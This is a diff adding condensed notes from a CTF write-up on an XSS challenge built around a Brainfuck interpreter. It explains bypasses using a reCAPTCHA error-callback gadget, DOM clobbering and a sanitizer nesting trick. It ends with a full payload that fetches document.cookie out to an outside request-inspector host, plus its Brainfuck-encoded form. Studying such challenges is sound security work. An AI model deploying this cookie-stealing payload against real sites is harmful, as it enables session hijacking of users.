@@ -1,0 +1,54 @@
+Source: https://gist.github.com/terjanq/e2198440c4fdfbdec43e921b600d4a1d#tokyowesterns-ctf-2020--writeups-by-terjanq
+
+# Protections from bf.js
+	// no xss please
+	output = output.replaceAll('<', '&lt;').replaceAll('>', '&gt;')
+	writeOutput();
+
+	function writeOutput() {
+		if (statusCode !== 3) {
+			if (CONFIG.unsafeRender) {
+				document.getElementById('output').innerHTML = output;
+			} else {
+				document.getElementById('output').innerText = output;
+			}
+		}
+	}
+
+# To Bypass first protection
+There is Google's reCAPTCHA that allows us to specify a function callback via data-error-callback attribute on g-recaptcha button.
+	data-error-callback executed when reCAPTCHA encounters an error
+
+# Works
+<button class="g-recaptcha" data-sitekey="1337" data-error-callback="alert">
+
+With that, we could potentially invoke the writeOutput function even if the program hasn't exited properly. And because of that, output could contain unreplaced < and > characters, because the replaceAll function (Protection 1) will never be called.
+
+# To Bypass second protection
+The CONFIG.unsafeRender check is easy to bypass with DOM Clobbering.
+
+```
+<a id=CONFIG name=unsafeRender>
+<a id=CONFIG>
+```
+
+
+Solution
+1. By calling initProgram which sets it back to 0.
+2. By calling runProgram which sets it to 1 and then runs the program.
+
+The former method was problematic because if the program finished before writeOutput was invoked, the statusCode would once again be set to 3.
+
+There is one downside. After initiating the program, it will also invoke the below snippet, which resets the prepared CONFIG clobbering in the payload because of innerText method.
+
+```
+program = document.getElementById('program').innerText;
+document.getElementById('program').innerHTML = DOMPurify.sanitize(program).toString();
+```
+
+Bypass with trick <<u>u>123
+
+# BrainFuck Encode this snippet
+<style/onload=fetch('https://requestinspector.com/inspect/01ejwm9tvn7qdy7z3vsdfej2cf/?c='+document.cookie)>
+
+++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>----------.>+++++++++++++++.+.+++++.-------------.-------.<-------------.>++++++++++.-.--.+++.--------------.+++.<++++++++++++++.>++.-.+++++++++++++++.-----------------.+++++.<<++++++++++.-.>>.++++++++++++..----.+++.<---.<++++++++..>>-.-------------.++++++++++++.++++.----------------.++++++++++++++.+.-----------.+++++.+++++.---.-----------.--.+++++++++++++++++.-----.+++.<<-.>>---------------.++++++++++++.--.<<+.>>----.+++++.+++++.---.-----------.--.+++++++++++++++++.<<.+.+.>>---------------.+++++.+++++++++++++.----------.<-.>+++++++.++.--------.<--.>+++.-------------.+++++++++++++++++++++.<.>+.<<++.>>----.---.---------------.++.-.+++++.<<-.>>-------.+++.<<---.>++++++++.>---.<--.<--------.++++.>>+.+++++++++++.------------.++++++++++++++++++.--------.--------.+++++++++.++++++.<<+++.>>-----------------.++++++++++++..----.--.----.<<-----.>+.<<a id=CONFIG name=unsafeRender>a id=CONFIG name=unsafeRender>><<a id=CONFIG>a id=CONFIG>><button class="g-recaptcha" data-sitekey="123" data-error-callback="initProgram"><button class="g-recaptcha" data-sitekey="1234" data-error-callback="writeOutput">
